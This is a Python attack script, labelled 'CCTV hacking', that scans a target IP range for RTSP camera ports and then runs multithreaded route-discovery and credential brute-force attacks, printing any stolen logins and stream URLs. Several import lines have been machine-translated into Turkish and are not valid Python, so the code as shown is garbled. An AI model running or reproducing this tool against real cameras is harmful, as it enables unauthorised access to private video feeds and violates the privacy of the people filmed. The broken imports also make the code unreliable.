import sys, time, argparse, re, threading
import pyfiglet #pip'i içe aktar
import iş parçacığından içe aktarma Kilidi
from colorama import init
termcolor ithal renkli
lib'lerden masscanscanner'ı masscan olarak içe aktarın
libs ithalat satıcısından
lib'lerden saldırı rotalarını içe aktar
lib'lerden saldırı kimlik bilgilerini içe aktar

init() # Colors
s_print_lock = Lock() # cctv güvenli yazdırma

ascii_banner = pyfiglet.figlet_format("cctv")
print("{}\n{}\n\n".format(ascii_banner, "CCTV hacking"))

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", required=True, help="CCTV tek bir IP adresinde hedefleyin.")
args = parser.parse_args()

cidrregex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/(3[0-2]|[1-2][0-9]|[0-9]))$"
ipv4regex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
if re.match(cidrregex, args.target) == None and re.match(ipv4regex, args.target) == None:
    print(colored("[ERR]Gecersiz CCTV Hedefi Belirtildi.", "red"))

    sys.exit(0)

print(colored("[INFO] RTSP Bağlantı Noktaları Taranıyor...", "cyan"))
scanResults = masscan.detect(args.target)

if scanResults == None:
    print(colored("[!] Hedef Bulunamadı.", "red"))
    sys.exit(0)

print(colored("[INFO] Port Taraması Tamamlandı.Saldırı Başlatılıyor...", "cyan"))

# Thread-safe print
def s_print(*a, **b):
    with s_print_lock:
        print(*a, **b)

def attack(target, port):
    authMethod = dealer.decide(target, port) # Geçerli hedefin kimlik doğrulama yöntemini alın

    if authMethod == None: # Hedef muhtemelen bilinen bir rota gerektiriyor
        s_print(colored("[INFO] {} at port {} Geçerli bir rota gerektirir.Bulmaya çalışıyorum...".format(target, port), "cyan"))
        routesFirst = attackroutes.start(target, port, authMethod)

        if routesFirst is not None and len(routesFirst) > 0: # If routes found
            s_print(colored("[INFO] We got valid route(s) for {}:{}! Saldırıyor...".format(target, port), "yellow"))
            # Halihazırda bulunan rotalarla kimlik bilgileri saldırısını başlatın.
            credsAfter = attackcredentials.start(target, port, authMethod, routesFirst)

            if credsAfter is not None and len(credsAfter) > 0:
                for cred in credsAfter:
                    s_print(colored("[SUCCESS] Bulunan: {}".format(cred), "green"))
            else:
                s_print(colored("[FAIL] Kimlik bilgisi bulunamadı {}:{}".format(target, port), "red"))
        else:
            s_print(colored("[FAIL] Adreste geçerli bir rota bulunamadı: {}:{}".format(target, port), "red"))
    else: # Özet veya Temel kimlik doğrulama
        s_print(colored("[INFO] {} at port {} Özet veya Temel kimlik doğrulama".format(target, port), "cyan"))
        credsFirst = attackcredentials.start(target, port, authMethod)

        if credsFirst is not None and len(credsFirst) > 0: # Kimlik bilgileri bulunursa
            s_print(colored("[INFO] Şunun için geçerli kimlik bilgilerine sahibiz: {}:{}!Şimdi rotalar bulunuyor.".format(target, port), "yellow"))

            for user in credsFirst[target][port]:
                # Geçerli kimlik bilgileriyle rota saldırısını başlatın
                routesAfter = attackroutes.start(target, port, authMethod, user, credsFirst[target][port][user])
                if routesAfter is not None and len(routesAfter) > 0:
                    for stream in routesAfter:
                        s_print(colored("[SUCCESS] Bulunan: {}".format(stream), "green"))
                else:
                    s_print(colored("[FAIL] Geçerli cctv bulunamadı {}:{}".format(target, port), "red"))
        else:
            s_print(colored("[FAIL] Kimlik bilgisi bulunamadı {}:{}".format(target, port), "red"))

for target in scanResults:
    for port in scanResults[target]["tcp"]:
        if scanResults[target]["tcp"][port]["state"] != "open":
            continue # Kapalı portları atla (sanity check - no need)

        thread = threading.Thread(target = attack, args = (target, port))
        thread.start()
        if threading.active_count() == 100:
            thread.join()